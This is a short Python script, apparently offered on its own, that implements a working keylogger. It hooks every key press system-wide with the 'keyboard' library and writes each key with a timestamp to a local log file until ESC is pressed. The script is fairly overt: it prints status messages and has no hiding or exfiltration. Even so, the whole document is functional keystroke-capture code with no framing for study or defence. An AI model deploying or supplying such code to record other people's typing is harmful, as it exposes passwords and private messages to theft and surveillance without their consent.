import keyboard
import datetime
import os

def log_keystroke(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {key}\n"
    
    with open("keystrokes.log", "a") as log_file:
        log_file.write(log_entry)

def start_keylogger():
    print("Keylogger started. Press ESC to stop.")
    
    # Create or clear the log file
    if os.path.exists("keystrokes.log"):
        open("keystrokes.log", "w").close()
    
    # Record all key presses
    keyboard.on_press(lambda event: log_keystroke(event.name))
    
    # Stop keylogger when ESC is pressed
    keyboard.wait("esc")
    print("Keylogger stopped.")

if __name__ == "__main__":
    try:
        start_keylogger()
    except Exception as e:
        print(f"An error occurred: {e}")
